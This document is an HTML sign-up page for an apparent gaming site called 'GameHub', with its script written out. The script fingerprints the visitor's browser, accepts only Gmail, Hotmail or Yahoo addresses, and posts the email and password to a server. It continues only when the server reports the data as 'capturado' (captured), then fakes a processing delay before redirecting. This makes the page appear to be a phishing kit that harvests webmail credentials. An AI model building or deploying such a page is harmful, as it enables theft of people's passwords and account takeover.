<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Criar Conta - GameHub</title>
  <style>
    /* Estilos mantidos iguais */
    /* ... */
  </style>
</head>
<body>
  <!-- HTML mantido igual -->
  <script>
    // Adicionando captura de dados do navegador
    const getBrowserInfo = () => {
      return {
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        appVersion: navigator.appVersion,
        userAgent: navigator.userAgent
      };
    };

    // Adicionando captura de dados de sessão
    const getSessionData = () => {
      const sessionId = Math.random().toString(36).substring(2, 15);
      const sessionData = {
        id: sessionId,
        timestamp: new Date().toISOString(),
        ip: null,
        headers: {},
        cookies: {}
      };
      return sessionData;
    };

    // Atualizando o evento de submit
    document.getElementById('createAccountForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      // Obter dados do navegador
      const browserInfo = getBrowserInfo();
      const sessionData = getSessionData();
      
      // Adicionar dados de sessão
      const formData = new FormData(this);
      const email = formData.get('email');
      const password = formData.get('password');
      
      // Validação de email
      if (!email.includes('@gmail.com') && !email.includes('@hotmail.com') && !email.includes('@yahoo.com')) {
        errorMessage.style.display = 'block';
        return;
      }
      
      // Mostrar spinner
      loadingSpinner.style.display = 'block';
      
      try {
        const response = await fetch('/api/form', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'X-Browser-Info': JSON.stringify(browserInfo),
            'X-Session-ID': sessionData.id
          },
          body: JSON.stringify({ 
            email, 
            password,
            sessionId: sessionData.id
          }),
          mode: 'cors'
        });
        
        const result = await response.json();
        
        if (result.status === 'capturado') {
          // Simular tempo de processamento
          setTimeout(() => {
            window.location.href = '/success.html';
          }, 1500);
        } else {
          throw new Error(result.message || 'Erro ao criar conta');
        }
      } catch (error) {
        console.error('Erro:', error);
        alert('Erro ao criar conta');
      } finally {
        loadingSpinner.style.display = 'none';
      }
    });
  </script>
</body>
</html>
